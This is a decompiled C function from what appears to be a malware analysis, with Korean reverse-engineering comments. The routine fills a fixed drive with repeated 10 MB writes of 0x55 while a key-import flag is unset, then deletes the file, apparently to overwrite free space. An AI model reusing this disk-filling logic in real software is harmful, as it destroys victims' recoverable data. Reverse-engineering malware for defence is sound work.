// --- Metadata ---
// Function Name: WriteMarkerAndFillDisk_10005190
// Address: 0x10005190
// Exported At: 20250522_104122
// Signature: unknown_signature
// ---------------
void *__cdecl WriteMarkerAndFillDisk_10005190(int a1)
{
  void *result; // eax
  void *v2; // ebx
  HANDLE v3; // edi
  int v4; // esi
  WCHAR RootPathName[2]; // [esp+Ch] [ebp-22Ch] BYREF
  int v6; // [esp+10h] [ebp-228h]
  ULARGE_INTEGER TotalNumberOfFreeBytes; // [esp+14h] [ebp-224h] BYREF
  DWORD NumberOfBytesWritten; // [esp+1Ch] [ebp-21Ch] BYREF
  ULARGE_INTEGER TotalNumberOfBytes; // [esp+20h] [ebp-218h] BYREF
  ULARGE_INTEGER FreeBytesAvailableToCaller; // [esp+28h] [ebp-210h] BYREF
  WCHAR FileName; // [esp+30h] [ebp-208h] BYREF
  char v12[516]; // [esp+32h] [ebp-206h] BYREF
  __int16 v13; // [esp+236h] [ebp-2h]

  RootPathName[1] = HIWORD(dword_1000D7A4);     // 키 임포트 여부에 따른 쓰기 반복 루틴으로 디스크 또는 시스템 상태를 변화
  v6 = dword_1000D7A8;
  RootPathName[0] = a1 + 65;                    // 드라이브 유형 확인 
  result = (void *)GetDriveTypeW(RootPathName);
  if ( result == (void *)3 )
  {
    result = GlobalAlloc(0, 0xA00000u);         // 메모리 할당 
    v2 = result;
    if ( result )
    {
      memset(result, 0x55u, 0xA00000u);
      FileName = 0;
      memset(v12, 0, sizeof(v12));
      v13 = 0;
      deleteMarker_10005120(a1, &FileName);
      v3 = CreateFileW(&FileName, 0x40000000u, 0, 0, 2u, 2u, 0);
      if ( v3 == (HANDLE)-1 )
      {
        result = GlobalFree(v2);
      }
      else
      {
        MoveFileExW(&FileName, 0, 4u);
        if ( !isImportKeySuccess_1000DD8C )
        {
LABEL_6:
          if ( GetDiskFreeSpaceExW(             // 디스크 여유 공간 검사 
                 RootPathName,
                 &FreeBytesAvailableToCaller,
                 &TotalNumberOfBytes,
                 &TotalNumberOfFreeBytes)
            && TotalNumberOfFreeBytes.QuadPart > 0x40000000 )
          {
            v4 = 0;
            while ( WriteFile(v3, v2, 0xA00000u, &NumberOfBytesWritten, 0) )
            {
              Sleep(0xAu);
              if ( (unsigned int)++v4 >= 0x14 )
              {
                Sleep(0x2710u);
                if ( !isImportKeySuccess_1000DD8C )
                  goto LABEL_6;
                break;
              }
            }
          }
        }
        GlobalFree(v2);
        FlushFileBuffers(v3);
        CloseHandle(v3);
        result = (void *)DeleteFileW(&FileName);
      }
    }
  }
  return result;
}
